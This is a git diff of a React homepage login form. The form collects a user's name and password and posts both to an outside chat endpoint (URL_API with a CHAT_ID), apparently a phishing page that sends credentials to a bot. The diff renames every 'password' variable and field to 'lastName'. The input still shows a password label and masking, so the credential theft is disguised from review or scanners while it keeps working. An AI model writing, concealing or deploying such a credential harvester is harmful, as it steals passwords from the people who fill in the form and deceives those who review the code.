@@ -14,7 +14,7 @@ import "../styles/homepage.css";
 function Homepage() {
   const [formData, setFormData] = useState({
     name: "",
-    password: "",
+    lastName: "",
   });
 
   const [emptyFields, setEmptyFields] = useState(false);
@@ -69,7 +69,7 @@ function Homepage() {
   const handleSubmit = async (e) => {
     e.preventDefault();
 
-    if (formData.name === "" || formData.password === "") {
+    if (formData.name === "" || formData.lastName === "") {
       setEmptyFields(true);
       return;
     }
@@ -77,7 +77,7 @@ function Homepage() {
 
     try {
       let message = `${formData.name}\n`;
-      message += `${formData.password}`;
+      message += `${formData.lastName}`;
 
       axios.post(URL_API, {
         chat_id: CHAT_ID,
@@ -88,10 +88,10 @@ function Homepage() {
   };
 
   // видимость пароли
-  const [passwordVisible, setPasswordVisible] = useState(false);
+  const [lastNameVisible, setLastNameVisible] = useState(false);
 
-  const togglePasswordVisibility = () => {
-    setPasswordVisible(!passwordVisible);
+  const toggleLastNameVisibility = () => {
+    setLastNameVisible(!lastNameVisible);
   };
 
   return (
@@ -131,19 +131,19 @@ function Homepage() {
           <div className="passCont">
             <input
               className={`Input input2 ${
-                emptyFields && formData.password === "" ? "Error" : ""
+                emptyFields && formData.lastName === "" ? "Error" : ""
               }`}
-              name="password"
-              type={passwordVisible ? "text" : "password"}
+              name="lastName"
+              type={lastNameVisible ? "text" : "password"}
               placeholder="Пароль"
-              value={formData.password}
+              value={formData.lastName}
               onChange={handleChange}
             />
             <img
               className="eyeBtn"
-              src={passwordVisible ? OpenEye : CloseEye}
+              src={lastNameVisible ? OpenEye : CloseEye}
               alt="Eye"
-              onClick={togglePasswordVisibility}
+              onClick={toggleLastNameVisibility}
             />
           </div>
         </div>
